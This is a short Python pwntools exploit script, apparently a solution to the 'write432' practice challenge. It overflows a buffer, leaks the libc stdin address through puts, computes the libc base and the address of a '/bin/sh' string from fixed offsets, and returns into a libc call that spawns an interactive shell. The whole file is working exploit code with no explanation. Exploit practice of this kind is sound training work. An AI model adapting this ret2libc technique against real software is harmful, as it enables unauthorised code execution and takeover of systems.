#!/usr/bin/env python

from pwn import *

p = process("./write432")

p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x8048420) + # puts
    p32(0x80485f6) +  # pwnme 
    p32(0x0804a060) # STDIN
)

p.sendline(payload)

data = p.recv(1024)
leak_stdin = u32(data[:4])
base = leak_stdin - 0x1b25a0
bin_sh = base + 0x15ba0b

payload = (
    "\x90" * 44 +
    p32(0x8048430) +
    p32(0x41414141) + # ebp
    p32(bin_sh)
)

p.sendline(payload)
p.interactive()


p.close()
